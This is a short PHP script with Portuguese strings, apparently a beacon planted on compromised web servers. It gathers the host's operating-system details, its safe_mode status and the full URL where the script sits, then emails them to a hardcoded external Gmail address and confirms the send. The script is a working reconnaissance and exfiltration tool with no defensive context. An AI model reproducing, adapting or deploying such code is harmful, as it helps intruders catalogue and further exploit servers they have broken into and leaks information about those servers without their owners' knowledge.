<?php
ini_set("max_execution_time",-1);
set_time_limit(0);
$user = @get_current_user();
$UNAME = @php_uname();
$SafeMode = @ini_get('safe_mode');
 if ($SafeMode == '') { $SafeMode = "OFF"; }
 else { $SafeMode = " $SafeMode "; }
$delet=($_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);
$dados=("<b>Produto</b> = " . $UNAME . "
<i>Seguran?a</i> = " . $SafeMode . "
http://" . $delet . " 

Muito obrigado : <u>delet</u>");
$email = "ticta66@googlemail.com";
$assunto = "AGORA";
$email1 = "ticta66@googlemail.com";
$headers = "From: <$email>\r\n";
$headers = "MIME-Version: 1.0\r\n";
$headers .= "Content-type: text/html; charset=iso-8859-1\r\n";
if(mail($email1,$assunto,$dados,$headers)){
echo "Isso, ja foi!";
exit();
}
else{
echo "N?o foi.";
exit();
}
?>